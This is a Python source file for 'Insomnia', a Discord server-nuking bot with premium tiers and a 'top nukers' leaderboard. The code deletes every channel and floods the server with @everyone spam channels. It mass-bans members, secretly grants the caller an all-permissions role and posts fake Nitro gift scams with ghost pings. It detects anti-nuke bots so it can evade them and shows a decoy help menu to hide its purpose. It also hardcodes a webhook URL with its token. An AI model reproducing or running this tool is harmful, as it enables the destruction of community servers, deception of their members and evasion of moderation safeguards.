import asyncio, base64, json, os, random
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View



intents = discord.Intents.all()

leaderboard_message = None  # we gonna save it global
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"
PREM = 1414916058875301939
MOD_ROLE_ID = 1414916058120192051
WHITELIST = [
    1340433509130436618,  # User 1
    941326582096744469,  # User 2
    1195644166105997315   # User 3
]
BLACKLISTED_GUILD_ID = 1418550612085440554  # ur server id
OWNER_ID = 1340433509130436618
LEADERBOARD_CHANNEL_ID = 1401931021544460389 # channel for leaderboard embed
TOKEN = ''  # ur bot token
LOG_WEBHOOK_URL = ''  # webhook for tracker channel


BLOCKED_BOT_IDS = [
    651095740390834176,  # security
    548410451818708993,  # wick
    # u can add more if u want
    
]

BLOCKED_BOT_NAMES = [
    "Security",
    "Wick",
    "Beemo",
    "AntiNuke",
]

def save_nuke_stats(user_id, guild):
    try:
        with open("nuke_stats.json", "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    if user_id not in stats["users"]:
        stats["users"][user_id] = {"uses": 1}
    else:
        stats["users"][user_id]["uses"] += 1

    if guild_id not in stats["servers"]:
        stats["servers"][guild_id] = {
            "user_id": user_id,
            "member_count": guild.member_count,
            "server_name": guild.name
        }

    with open("nuke_stats.json", "w") as f:
        json.dump(stats, f, indent=2)

def get_show_username(user_id):
    config = get_user_config(user_id)
    return config.get("show_username", True)


def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)


class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int) -> (bool, int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        """Entfernt User, deren Cooldown schon abgelaufen ist (um Speicher zu sparen)."""
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)  # Default True

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "insomnia-on-top")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "insomnia")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "insomnia owns this")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "insomnia owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "join insomnia")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)


@tasks.loop(minutes=10)
async def update_leaderboard():
    if not os.path.exists(NUKE_STATS_FILE):
        return

    with open(NUKE_STATS_FILE, "r") as f:
        data = json.load(f)

    leaderboard = []

    for server_id, info in data.get("servers", {}).items():
        user_id = info.get("user_id")
        member_count = info.get("member_count", 0)
        server_name = info.get("server_name", "Unknown")

        if user_id:
            leaderboard.append((user_id, member_count, server_name))

    user_best = {}
    for user_id, member_count, server_name in leaderboard:
        if user_id not in user_best or member_count > user_best[user_id][0]:
            user_best[user_id] = (member_count, server_name)

    sorted_users = sorted(user_best.items(), key=lambda x: x[1][0], reverse=True)[:10]

    embed = discord.Embed(
        title="🏆・Top Nukers (by server size)",
        color=0xa874d1
    )

    lines = ["Updated every 10 minutes\n"]

    for i, (user_id, (member_count, server_name)) in enumerate(sorted_users, 1):
        try:
            user = await bot.fetch_user(int(user_id))
            line = f"{i}. **{user.display_name}** ({user.name}) - **{server_name}**: `{member_count}` members\n"
            lines.append(line)
        except:
            continue
    
    embed.description = "\n".join(lines)

    channel = bot.get_channel(LEADERBOARD_CHANNEL_ID)
    if channel:
        async for msg in channel.history(limit=10):
            if msg.author == bot.user and msg.embeds:
                await msg.delete()
        await channel.send(embed=embed)

async def safe_webhook_send(webhook, channel, content=None, embed=None, username=None, avatar_url=None):
    try:
        await webhook.send(content=content, embed=embed, username=username, avatar_url=avatar_url)
    except HTTPException as e:
        if e.status == 429:
            print("[!] Webhook rate limited, sending message normally instead.")
            await channel.send(content=content, embed=embed)
        else:
            print(f"[!] Webhook send failed: {e}")

async def handle_toggle_setting(interaction: Interaction, setting_key: str, current_value: bool):
    new_value = not current_value
    set_user_config(interaction.user.id, setting_key, new_value)
    await interaction.response.send_message(f"`{setting_key}` set to `{new_value}`.", ephemeral=True)

async def handle_set_name_setting(interaction: Interaction, setting_key: str, new_value: str):
    user_id = interaction.user.id
    if setting_key != "show_username":
        if not is_premium_user(user_id):
            defaults = {
                "channel_name": "insomnia-on-top",
                "webhook_name": "insomnia",
                "webhook_message": "Server has been nuked!",
                "server_name": "insomnia owns this",
                "role_name": "join insomnia",
            }
            set_user_config(user_id, setting_key, defaults.get(setting_key, ""))
            await interaction.response.send_message(
                f"You must be a premium user to set `{setting_key}`. Value reset to default.", ephemeral=True
            )
            return

    set_user_config(user_id, setting_key, new_value)
    await interaction.response.send_message(f"`{setting_key}` set to `{new_value}`.", ephemeral=True)


async def send_log(ctx):
    guild = ctx.guild
    user = ctx.author
    show_name = get_show_username(user.id)

    log_text = ""
    try:
        with open("log_messages.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
            if lines:
                log_text = random.choice(lines)
    except Exception as e:
        print(f"[!] log msg error: {e}")


    embed = discord.Embed(
        title="Command Executed",
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="Server Name", value=f"`{guild.name}`", inline=True)
    embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="Server Owner", value=f"`{guild.owner}` ({guild.owner.name})", inline=False)
    embed.add_field(name="Server Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
    embed.add_field(name="Roles", value=f"`{len(guild.roles)}`", inline=True)
    embed.add_field(name="Emojis", value=f"`{len(guild.emojis)}`", inline=True)
    embed.add_field(name="Boost Level", value=f"`{guild.premium_tier}`", inline=True)
    embed.add_field(name="Boost Count", value=f"`{guild.premium_subscription_count}`", inline=True)
    embed.add_field(name="Verification Level", value=f"`{str(guild.verification_level).capitalize()}`", inline=True)

    if show_name:
        embed.add_field(
            name="Command Run By",
            value=f"`{user.display_name}` ({user.name})",
            inline=False
        )
    else:
        embed.add_field(
            name="Command Run By",
            value="`hidden`",
            inline=False
        )

    embed.add_field(name="Bot Latency", value=f"`{round(ctx.bot.latency * 1000)} ms`", inline=True)

    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text=f"Server ID: {guild.id}")

    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=session)
        await webhook.send(content=log_text or None, embed=embed)


class SettingsModal(discord.ui.Modal):
    def __init__(self, user_id: int):
        super().__init__(title="Configure your settings")
        self.user_id = user_id

        self.show_username_input = discord.ui.TextInput(
            label="Show username? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3,
            required=False
        )
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="nuked-channel",
            default=get_channel_name(user_id),
            max_length=32,
            required=False
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="Nuke Webhook",
            default=get_webhook_name(user_id),
            max_length=32,
            required=False
        )
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="Server has been nuked!",
            default=get_webhook_message(user_id),
            max_length=100,
            required=False
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="Nuked Server",
            default=get_server_name(user_id),
            max_length=32,
            required=False
        )


        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        is_premium = is_premium_user(user_id)

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            set_show_username(user_id, show_username_input == "yes")

        def safe_set(key, value, default):
            if is_premium:
                set_user_config(user_id, key, value)
            else:
                set_user_config(user_id, key, default)

        safe_set("channel_name", self.channel_name_input.value.strip(), "nuked-channel")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "Nuke Webhook")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), "Server has been nuked!")
        safe_set("server_name", self.server_name_input.value.strip(), "Nuked Server")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)


class DashboardView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=180)
        self.user_id = user_id

    @discord.ui.button(label="Configure Settings", style=discord.ButtonStyle.primary)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SettingsModal(self.user_id))


class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()


@bot.command(name="addprem") # this command was only for re-adding roles to premium users. not really needed.
async def addprem(ctx):
    if ctx.author.id not in WHITELIST:
        await ctx.send("❌ no perms to use this.")
        return

    with open("premium.json", "r", encoding="utf-8") as f:
        premium_ids = json.load(f)

    role = ctx.guild.get_role(PREM)
    if not role:
        await ctx.send("❌ role not found")
        return

    found_count = 0
    added_count = 0

    for user_id in premium_ids:
        member = ctx.guild.get_member(user_id)
        if member:
            found_count += 1
            if role not in member.roles:
                try:
                    await member.add_roles(role)
                    added_count += 1
                except discord.Forbidden:
                   print("no perms or not found")

    await ctx.send(f"{found_count} from {len(premium_ids)} users found on the server")
    await ctx.send(f"adding {added_count} roles")
    await ctx.send(f"finished adding {added_count} roles")

@bot.tree.command(name="dashboard", description="Show your settings dashboard")
async def dashboard(interaction: discord.Interaction):
    user_id = interaction.user.id

    show_username = get_show_username(user_id)
    channel_name = get_channel_name(user_id)
    webhook_name = get_webhook_name(user_id)
    webhook_message = get_webhook_message(user_id)
    server_name = get_server_name(user_id)
    role_name = get_role_name(user_id)

    embed = discord.Embed(title="User Dashboard", color=discord.Color.blue())
    embed.add_field(name="Show Username", value="Yes" if show_username else "No", inline=True)
    embed.add_field(name="Channel Name", value=channel_name, inline=True)
    embed.add_field(name="Webhook Name", value=webhook_name, inline=True)
    embed.add_field(name="Webhook Message", value=webhook_message, inline=False)
    embed.add_field(name="Server Name", value=server_name, inline=True)
    embed.add_field(name="Role Name", value=role_name, inline=True)

    view = DashboardView(user_id)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)



@bot.command() # !modraid command
@commands.has_role(MOD_ROLE_ID)
@cooldown(1, 600, BucketType.user) 
async def modraid(ctx, *, message=None):
    if message is None:
        await ctx.send("use a message dumbass")
        return
    
    role = ctx.guild.get_role(MOD_ROLE_ID)
    if role is None:
        await ctx.send("role not found.")
        return

    await ctx.send(f"{message}\n<@&1415313470710349834>\n\nSent from {ctx.author.mention}")
    try:
        await ctx.message.delete() 
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete messages.")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to delete message: {e}")

@modraid.error
async def modraid_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("You don't have permission to use this command.")
    elif isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"This command is on cooldown. Try again in {int(error.retry_after)} seconds.")

@bot.command()
async def fakenitro(ctx):
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`this server is blacklisted`")
        return

    try:
        await ctx.message.delete()
    except:
        pass

    try:
        dm_channel = await ctx.author.create_dm()
        await dm_channel.send(
            "**:gift: Fake Nitro Setup**\n"
            "Please choose your method:\n\n"
            "🔹 `1` - Spam every channel\n"
            "🔹 `2` - Create giveaway channel with ghost pings (looks more real = more people joining)\n\n"
            "Reply with the number!"
        )

        def check(m):
            return m.author == ctx.author and m.channel == dm_channel and m.content in ["1", "2"]

        reply = await bot.wait_for("message", check=check, timeout=60)

        if reply.content == "1":
            method = "spam"
        elif reply.content == "2":
            method = "giveaway"
        else:
            return await dm_channel.send("❌ Invalid selection, setup aborted.")

        is_premium = is_premium_user(ctx.author.id)

        if is_premium:
            await dm_channel.send("You are a premium user! Please send your custom invite link or type `default` to use the standard link.")

            def link_check(m):
                return m.author == ctx.author and m.channel == dm_channel

            try:
                link_msg = await bot.wait_for("message", check=link_check, timeout=60)
                if link_msg.content.lower() == "default":
                    fake_link = "https://discord.gg/VSQzzAMVw3"
                else:
                    fake_link = link_msg.content.strip()
            except asyncio.TimeoutError:
                fake_link = "https://discord.gg/VSQzzAMVw3"
        else:
            fake_link = "https://discord.gg/VSQzzAMVw3"
            await dm_channel.send("You dont have premium :( Using default invite link.")

        embed = discord.Embed(
            description=(
                f"# <a:nitro:1402674645790101615> You've been gifted a subscription!\n"
                f"## Click [HERE]({fake_link}) to claim **1 month of Discord Nitro.**"
            ),
            color=0x5865F2
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1402005248108793970/1402666426791231618/19402688007447.png")
        embed.set_footer(text="Note: This gift will expire in 48 hours.")

        if method == "spam":
            success = 0
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send(embed=embed)
                    await channel.send("@everyone")
                    success += 1
                except:
                    continue
            await dm_channel.send(f"✅ Nitro embed sent to `{success}` channels, everyone pinged!")

        elif method == "giveaway":
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(
                    view_channel=True,
                    send_messages=False,
                    add_reactions=False,
                    read_message_history=True
                )
            }

            channel = await ctx.guild.create_text_channel("🎁nitro-giveaway", overwrites=overwrites)
            await channel.send(embed=embed)

            for i in range(20):
                msg = await channel.send("@everyone")
                await asyncio.sleep(0.3)
                try:
                    await msg.delete()
                except:
                    pass

            await dm_channel.send("✅ 20 ghost pings sent in the giveaway channel!")

    except Exception as e:
        await ctx.author.send(f"❌ Error: {e}")


@bot.command()
async def invite(ctx):
    invite_link = discord.utils.oauth_url(
        client_id=ctx.bot.user.id,
        permissions=discord.Permissions(administrator=True),
        scopes=("bot",)
    )

    embed = discord.Embed(
        title="🔗 Invite The Bot",
        description="Click the link below to invite the bot with admin permissions:",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Invite Link", value=f"[Click here to invite]({invite_link})", inline=False)
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.timestamp = datetime.utcnow()

    try:
        await ctx.author.send(embed=embed)
        await ctx.reply("📬 I've sent you the bot invite in your DMs!", ephemeral=True if ctx.guild else False)
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you the invite. Please check your privacy settings.", ephemeral=True if ctx.guild else False)


leave_hook = "https://ptb.discord.com/api/webhooks/1404434190828703744/97hc9pbvw-ecqN5idWiTdjC6oLUHzoDllzFUwmGIwpgmSsYV8_2PUR3ILhsmXNySv5GW"

async def log(message: str):
    print(message)

    async with aiohttp.ClientSession() as session:
        try:
            await session.post(leave_hook, json={"content": message})
        except Exception as e:
            print(f"[LOGGING ERROR] {e}")

@bot.command()
async def leave(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized to use this command.")
        return
    await leave_all_servers()

@tasks.loop(hours=6)
async def auto_leave_task():
    await leave_all_servers()

async def leave_all_servers():
    all_guilds = bot.guilds
    to_leave = [g for g in all_guilds if g.id != BLACKLISTED_GUILD_ID]
    total_to_leave = len(to_leave)

    await log(f"[AUTO-LEAVE] I am in {len(all_guilds)} servers, leaving {total_to_leave} (excluding blacklist).")

    left = 0
    for i, guild in enumerate(to_leave, 1):
        try:
            await guild.leave()
            left += 1
        except Exception as e:
            await log(f"[ERROR] Could not leave {guild.name} ({guild.id}): {e}")

        if i % 5 == 0 or i == total_to_leave:
            await log(f"[AUTO-LEAVE] Progress: {left}/{total_to_leave}")

        await asyncio.sleep(1)

    await log(f"[AUTO-LEAVE] Finished! Left {left} servers (excluding blacklist).")

@auto_leave_task.before_loop
async def before_auto_leave():
    await bot.wait_until_ready()


bot.remove_command("help")

@bot.command()
async def nhelp(ctx):
    embed = discord.Embed(
        title="⚡ Insomnia Bot Help",
        description="List of available commands:",
        color=discord.Color.blurple()
    )
    embed.set_thumbnail(url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url)

    embed.add_field(
        name="`!setup`",
        value="Completely wipes the server.",
        inline=False
    )

    embed.add_field(
        name="`!admin`",
        value="Tries to secretly give you admin.",
        inline=False
    )

    embed.add_field(
        name="`[💎] !massban`",
        value="Bans everyone!",
        inline=False
    )

    embed.add_field(
        name="`!info [@user]`",
        value="Displays how many servers a user has nuked. Also shows if the user is Premium.",
        inline=False
    )

    embed.add_field(
        name="`!invite`",
        value="Sends the bot invite to your dms.",
        inline=False
    )

    embed.add_field(
        name="`!fakenitro`",
        value="Create a fake nitro giveway and lure people into joining ur server.",
        inline=False
    )

    embed.add_field(
        name="`/dashboard`",
        value="Displays a dashboard for custom settings (e.g. show username in tracker 'true/false')",
        inline=False
    )

    embed.add_field(
        name="`!help`",
        value="Shows a real looking fake help embed.",
        inline=False
    )
    
    embed.add_field(
        name="`!nhelp`",
        value="Shows this help embed",
        inline=False
    )

    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.timestamp = datetime.utcnow()

    await ctx.send(embed=embed)

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="⚡ Nova Bot Help",
        description="Here are some of the available commands:",
        color=discord.Color.gold()
    )
    embed.set_thumbnail(
        url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url
    )

    embed.add_field(
        name="`!customvc`",
        value="Create your own temporary custom voice channel with full control (name, user limit, lock/unlock).",
        inline=False
    )
    embed.add_field(
        name="`!autorole`",
        value="Automatically assigns roles to new members when they join the server.",
        inline=False
    )
    embed.add_field(
        name="`!reactionroles`",
        value="Set up reaction roles with a single command.",
        inline=False
    )
    embed.add_field(
        name="`!levels`",
        value="Track activity and earn XP/levels with a fully customizable ranking system.",
        inline=False
    )
    embed.add_field(
        name="`!music [song]`",
        value="Play high-quality music in your voice channel (with playlist support).",
        inline=False
    )
    embed.add_field(
        name="`!dashboard`",
        value="Opens a web dashboard where you can manage bot settings (prefix, modules, etc.).",
        inline=False
    )
    embed.add_field(
        name="`!welcome`",
        value="Set up custom welcome & goodbye messages with images and embeds.",
        inline=False
    )
    embed.add_field(
        name="`!tags [name]`",
        value="Create and store custom text snippets (like shortcuts for announcements).",
        inline=False
    )
    embed.add_field(
        name="`!premium`",
        value="Shows how to unlock extra features and perks.",
        inline=False
    )

    embed.add_field(
        name="`!help`",
        value="Shows this help menu.",
        inline=False
    )

    embed.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
    )
    embed.timestamp = datetime.utcnow()

    await ctx.send(embed=embed)


@bot.command()
async def massban(ctx):
    guild = ctx.guild
    author = ctx.author

    if not is_premium_user(author.id):
        await ctx.send("💎 This command is only available for premium users.")
        return

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.send("`this server is blacklisted`")
        return

    members_to_ban = [m for m in guild.members if m != author and guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    count = 0

    confirm_msg = await ctx.send(
        f"🚀 **Trying to ban {total} members...**\n\n"
        f"⚠️ Make sure to put the bot's role **above every other role**.\n"
        f"The bot can only ban users that are **under** its role.\n\n"
        f"React with ✅ to confirm or ❌ to cancel."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Timed out — massban cancelled.")
        return

    if str(reaction.emoji) == "❌":
        await ctx.send("❌ Cancelled massban.")
        return

    await ctx.send(f"🚀 Starting to ban {total} members...")

    async with aiohttp.ClientSession() as session:
        for member in members_to_ban:
            try:
                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                headers = {
                    "Authorization": f"Bot {bot.http.token}",
                    "Content-Type": "application/json"
                }
                json_data = {"delete_message_days": 0, "reason": "Massban"}

                async with session.put(url, json=json_data, headers=headers) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        print(f"[!] Ratelimit: wait {retry_after} seconds...")
                        await asyncio.sleep(retry_after)
                        continue
                    elif resp.status in (200, 201, 204):
                        count += 1
                        print(f"[{count}/{total}] Banned: {member}")
                    else:
                        print(f"[!] Error while banning {member}: {resp.status}")
            except Exception as e:
                print(f"[!] Can't ban {member}: {e}")

    await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")

@bot.command()
async def admin(ctx):
    guild = ctx.guild
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`this server is blacklisted`")
        return

    await ctx.message.delete()

    role = discord.utils.get(guild.roles, name="verified_user")
    if role is None:
        perms = discord.Permissions.all()
        role = await guild.create_role(name="verified_user", permissions=perms)
        msg = await ctx.send("✅ done!")
    else:
        msg = await ctx.send("✅ already done!")

    await ctx.author.add_roles(role)

    await msg.delete(delay=1)


@bot.command()
async def info(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author

    user_id_str = str(user.id)

    if not os.path.exists(NUKE_STATS_FILE):
        await ctx.send("No data available.")
        return

    with open(NUKE_STATS_FILE, "r") as f:
        data = json.load(f)

    nuke_count = data.get("users", {}).get(user_id_str, {}).get("uses", 0)

    max_server = None
    max_members = -1

    for guild_id, info in data.get("servers", {}).items():
        if user_id_str in data["users"]:
            if info["member_count"] > max_members:
                max_members = info["member_count"]
                max_server = info["server_name"]

    is_premium = is_premium_user(user.id)

    embed = discord.Embed(
        title="User Info",
        color=discord.Color.blurple()
    )
    embed.set_author(name=f"{user.name}", icon_url=user.avatar.url if user.avatar else None)
    embed.add_field(name="👤 Nukes executed", value=f"`{nuke_count}`", inline=True)
    embed.add_field(name="⭐ Premium", value=f"`{'Yes' if is_premium else 'No'}`", inline=True)

    if max_server:
        embed.add_field(name="📈 Largest Server Nuked", value=f"`{max_server}` ({max_members} members)", inline=False)

    await ctx.send(embed=embed)



async def detect_antinuKe_bots(guild):
    found_bots = []

    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                found_bots.append(f"{bot_name} ({member.id})")

    return found_bots


@bot.command()
async def setup(ctx):
    guild = ctx.guild
    user = ctx.author
    user_id = ctx.author.id
    user_config = get_user_config(user_id)

    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`this server is blacklisted`")
        return

    if len(guild.members) < 5:  # min 5 members, u can change it if u want
        try:
            await user.send(f"❌ Server `{guild.name}` needs to have a minimum of 5 members. Leaving..")
            print("not 5 members")
        except:
            print(f"[!] Konnte {user} keine DM schicken.")
        await guild.leave()
        return

    found = await detect_antinuKe_bots(guild)
    if found:
        print(f"[!] Antinuke-Bots found:\n" + "\n".join(found) + "\nbypassing...")

        webhook_message = user_config.get("webhook_message", "insomnia owns this")
        if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
            spam_message = "@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI"
        else:
            spam_message = webhook_message

        for channel in guild.text_channels:
            try:
                await asyncio.gather(*(
                    channel.send(spam_message) for _ in range(10)
                ))
            except Exception as e:
                print(f"[ERROR] Spam in {channel.name} - : {e}")

        return

    save_nuke_stats(user.id, guild)

    channel_name = user_config.get("channel_name", "insomnia-on-top")
    webhook_message = user_config.get("webhook_message", "insomnia owns this")
    server_name = user_config.get("server_name", guild.name)
    role_name = user_config.get("role_name", "insomnia-owns-u")

    try:
        await guild.edit(name=server_name)
    except Exception as e:
        print(f"[!] Server rename failed: {e}")

    folder_path = "icons"
    valid_extensions = (".png", ".jpg", ".jpeg")
    images = [file for file in os.listdir(folder_path) if file.lower().endswith(valid_extensions)]
    selected = random.choice(images)
    image_path = os.path.join(folder_path, selected)
    try:
        with open(image_path, "rb") as f:
            icon = f.read()
            await ctx.guild.edit(icon=icon)
    except Exception as e:
        print(f"[ERROR] Failed to update icon: {e}")

    delete_channels = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_channels, return_exceptions=True)

    async def create_channel_and_send_message():
        try:
            ch = await guild.create_text_channel(name=channel_name)

            embed = discord.Embed(
                title="**__NUKED BY INSOMNIA__**",
                description=(
                    "`Unfortunately this server has been nuked due to admins' inattention.`\n"
                    "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/VSQzzAMVw3) our discord server.\n"
                    "**Insomnia has:**\n"
                    "> **Powerful bots with uptime 24/7**\n"
                    "> **Raid/Nuke features**\n"
                    "> **Good community**"
                ),
                color=0xb161f9
            )
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")

            if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
                is_premium = is_premium_user(user.id)
                spams = 25 if is_premium else 10
                for _ in range(spams):
                    await ch.send(
                        content="@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI",
                        embed=embed,
                        tts=True
                    )
            else:
                for _ in range(10):
                    await ch.send(webhook_message)

        except Exception as e:
            print(f"[!] Channel/message failed: {e}")

    is_premium = is_premium_user(user.id)
    channel_count = 100 if is_premium else 50
    await asyncio.gather(*(create_channel_and_send_message() for _ in range(channel_count)))

    try:
        await guild.create_role(name=role_name)
    except Exception as e:
        print(f"[!] Role creation failed: {e}")

    await guild.leave()


@setup.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permission to use this command.")
    else:
        await ctx.send(f"Error: {error}")


@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}!")
    update_leaderboard.start()
    print("Updated leaderboard")
    await bot.tree.sync()
    print("Slash commands synced.")
    auto_leave_task.start()


bot.run(TOKEN)